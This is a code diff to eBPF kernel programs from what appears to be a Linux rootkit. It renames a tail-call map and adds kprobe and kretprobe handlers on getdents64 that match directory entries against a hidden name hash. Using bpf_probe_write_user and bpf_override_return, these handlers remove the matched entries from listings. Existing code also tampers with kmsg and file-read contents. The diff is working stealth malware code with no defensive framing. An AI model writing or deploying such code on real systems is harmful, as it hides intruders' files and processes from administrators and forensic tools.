@@ -104,7 +104,7 @@ int kmsg(struct pt_regs *ctx)
         fd_attr->read_buf += o1 + sizeof(override) - 1;
         fd_attr->read_size = retval - (o1 + sizeof(override) - 1);
 
-        bpf_tail_call(ctx, &read_ret_progs, FILL_WITH_ZERO_PROG);
+        bpf_tail_call(ctx, &rk_progs, FILL_WITH_ZERO_PROG);
     }
 
     if (hash == 0x55c7edee212d1ef4)
@@ -115,7 +115,7 @@ int kmsg(struct pt_regs *ctx)
         fd_attr->read_buf += o1 + sizeof(override) - 1;
         fd_attr->read_size = retval - (o1 + sizeof(override) - 1);
 
-        bpf_tail_call(ctx, &read_ret_progs, FILL_WITH_ZERO_PROG);
+        bpf_tail_call(ctx, &rk_progs, FILL_WITH_ZERO_PROG);
     }
 
     return 0;
@@ -143,7 +143,7 @@ int override_content(struct pt_regs *ctx)
     }
 
     struct rk_fd_content_key_t fd_content_key = {
-        .id = fd_attr->override_id,
+        .id = fd_attr->action.override_id,
         .chunk = fd_attr->override_chunk,
     };
 
@@ -164,6 +164,72 @@ int override_content(struct pt_regs *ctx)
         }
 
         bpf_probe_write_user(fd_attr->read_buf + i, &fd_content->content[i], 1);
+    }
+
+    return 0;
+}
+
+SEC("kprobe/override_getdents")
+int override_getdents(struct pt_regs *ctx)
+{
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
+    if (!getdents)
+    {
+        return 0;
+    }
+
+    int size = (unsigned int)PT_REGS_RC(ctx);
+
+    char name[256] = {};
+    u64 hash;
+
+#pragma unroll
+    for (int i = 0; i != 200; i++)
+    {
+        if (getdents->read <= size)
+        {
+            bpf_probe_read_str(name, sizeof(name), (void *)getdents->dirent->d_name);
+
+            hash = FNV_BASIS;
+            update_hash_str(&hash, name);
+
+            if (hash == getdents->hidden_hash)
+            {
+                getdents->overridden = 1;
+            }
+            if (getdents->overridden)
+            {
+                struct linux_dirent64 next;
+                bpf_probe_read(&next, sizeof(next), (void *)(getdents->dirent + 1));
+
+                bpf_probe_write_user((void *)getdents->dirent, (void *)&next, sizeof(struct linux_dirent64));
+            }
+
+            getdents->read += sizeof(struct linux_dirent64);
+            getdents->dirent++;
+        }
+    }
+
+    bpf_tail_call(ctx, &rk_progs, OVERRIDE_GET_DENTS);
+
+    return 0;
+}
+
+SEC("kretprobe/__x64_sys_getdents64")
+int __x64_sys_getdents64_ret(struct pt_regs *ctx)
+{
+    u64 pid_tgid = bpf_get_current_pid_tgid();
+    struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
+    if (!getdents)
+    {
+        return 0;
+    }
+
+    if (getdents->overridden)
+    {
+        int size = (int)PT_REGS_RC(ctx);
+        bpf_override_return(ctx, size - sizeof(struct linux_dirent64));
     }
 
     return 0;
